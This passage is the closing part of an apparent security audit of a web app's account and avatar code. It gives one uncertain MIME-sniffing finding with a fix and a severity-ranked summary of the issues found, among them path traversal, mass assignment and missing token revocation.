- [UNCERTAIN] because `res.sendFile` sets MIME via the path extension; browsers should not execute a renamed `.exe`-as-`.png`. The bigger, confirmed issue is path-traversal (CRITICAL, above). Call this out here for completeness.
- Fix: Sniff magic bytes with `file-type` / `image-size` and reject non-images.

---

## Summary
- Critical (5): self-deactivation bypass via wrong field, missing `tokenVersion` bumps on deactivate / admin-reset / self-change-password, path-traversal on avatar upload+serve.
- High (9): mass-assignment via untyped DTOs (profile update, preferences, change-password), no rate limiting on password reset, modulo-biased temp-password + leak via logs, HTML injection in email templates, DTO/service role-set drift + no token-version bump on role change, avatar path inconsistency + auth-less serving.
- Medium (9): SMTP hardening, silent mail failures, temp-password echoed in HTTP, missing pagination caps / search length cap, non-transactional uniqueness checks, `JSON.parse` without guard, `newPassword == currentPassword` allowed.
- Low (6): password-policy drift, route prefix drift, redundant Global import, email not lowercased on create, missing `isFailure` check on `getPreferences`, self-reset not guarded.
- Uncertain (2): MIME sniffing on avatars; role enum source-of-truth (roles service not opened).
